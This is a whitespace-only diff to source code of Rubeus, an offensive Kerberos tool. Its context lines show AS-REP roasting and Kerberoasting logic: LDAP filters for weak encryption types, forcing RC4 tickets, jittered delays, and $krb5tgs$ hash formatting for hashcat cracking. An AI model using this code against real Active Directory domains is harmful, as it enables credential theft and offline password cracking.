@@ -55,7 +55,7 @@ namespace Rubeus
                 {
                     userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
                 }
-                
+
                 if (String.IsNullOrEmpty(domain))
                 {
                     domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
@@ -191,7 +191,7 @@ namespace Rubeus
                 Console.WriteLine("No supported encryption types provided");
                 return;
             }
-            
+
             if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
             {
                 Console.WriteLine("[+] AS-REQ w/o preauth successful!");
@@ -442,7 +442,7 @@ namespace Rubeus
                             System.Net.IPHostEntry dcInfo = System.Net.Dns.GetHostEntry(dcIP);
                             dc = dcInfo.HostName;
                         }
-                        
+
                         // request a service tickt for LDAP on the target DC
                         kirbiBytes = Ask.TGS(tgtUserName, ticketDomain, ticket, clientKey, etype, string.Format("ldap/{0}", dc), etype, null, false, dc, false, enterprise, false);
                     }
@@ -495,7 +495,7 @@ namespace Rubeus
                     encFilter = "(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
                 }
 
-                // Note: I originally thought that if enctypes included AES but DIDN'T include RC4, 
+                // Note: I originally thought that if enctypes included AES but DIDN'T include RC4,
                 //       then RC4 tickets would NOT be returned, so the original filter was:
                 //  !msds-supportedencryptiontypes=*                        ->  null supported etypes, so RC4
                 //  msds-supportedencryptiontypes=0                         ->  no supported etypes specified, so RC4
@@ -642,7 +642,7 @@ namespace Rubeus
                                     // if we're roasting RC4, but AES is supported AND we have a TGT, specify RC4
                                     etype = Interop.KERB_ETYPE.rc4_hmac;
                                 }
-                                
+
                                 bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, etype);
                                 Helpers.RandomDelayWithJitter(delay, jitter);
                                 if (!result && autoenterprise)
@@ -857,7 +857,7 @@ namespace Rubeus
                 // always use the doamin that our TGT is for
                 tgtDomain = TGT.tickets[0].sname.name_string[1];
             }
-            
+
             // extract out the info needed for the TGS-REQ request
             string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
             string domain = TGT.enc_part.ticket_info[0].prealm.ToLower();
@@ -956,7 +956,7 @@ namespace Rubeus
             if ((encType == 18) || (encType == 17))
             {
                 int checksumStart = cipherText.Length - 24;
-                //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.            
+                //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.
                 hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
             }
             else if (encType == 3 && !string.IsNullOrWhiteSpace(desPlainText))
